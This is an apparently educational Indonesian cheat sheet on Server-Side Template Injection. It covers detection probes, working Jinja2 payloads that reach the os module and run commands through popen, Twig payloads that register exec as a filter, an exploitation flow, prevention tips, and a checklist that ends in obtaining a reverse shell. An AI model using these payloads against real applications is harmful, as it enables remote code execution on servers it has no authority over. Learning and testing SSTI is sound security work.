# 🎨 Server‑Side Template Injection (SSTI) — Eksekusi Kode Lewat Template

> **Tujuan:** Mengeksekusi perintah di server dengan menyisipkan ekspresi template engine (Jinja2, Twig, dll.) yang diproses oleh aplikasi.

---

## 📌 Penjelasan Singkat

SSTI terjadi ketika input pengguna **dirender sebagai bagian template** (bukan data), memungkinkan attacker menyuntik ekspresi yang dieksekusi engine.

---

## 🕵️ Deteksi (Dasar)

```
{{7*7}}       # Jinja2 / Twig
${7*7}        # Expression Language
#{7*7}        # Beberapa framework
<%= 7*7 %>    # ERB (Ruby)
```

> **Penjelasan:** Jika `{{7*7}}` di‑render menjadi `49`, input dieksekusi sebagai ekspresi template.

---

## 🐍 Jinja2 (Python/Flask)

### Identifikasi Template Context

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### OS Command Execution

```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Alur eksploitasi:**

```text
Input Template
   ↓
Jinja2 memproses ekspresi
   ↓
Akses object / global namespace
   ↓
Akses modul os
   ↓
Command Execution
   ↓
Potensi RCE
```

---

## 🐘 Twig (PHP)

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

> **Catatan:** Payload Jinja2 tidak berlaku untuk Twig — sintaks engine berbeda.

---

## ⚠️ Dampak SSTI

```text
SSTI → Template Injection → Akses Context → Object/Function → Code Execution → RCE
```

---

## 🛡️ Pencegahan

- Jangan render input pengguna langsung sebagai template.
- Gunakan sandboxing sesuai template engine.
- Pisahkan data dari template/code.
- Terapkan allowlist input.
- Prinsip least privilege pada aplikasi.

---

## ✅ Checklist SSTI

- [ ] Deteksi dengan `{{7*7}}` (atau sintaks engine target).
- [ ] Identifikasi engine (Jinja2, Twig, Freemarker, dll).
- [ ] Akses template context (`__class__`, `__mro__`, dll).
- [ ] Eksekusi command via `popen`/subprocess.
- [ ] Dapatkan reverse shell.

---

## 📚 Referensi

- [PortSwigger – Server‑Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks – SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
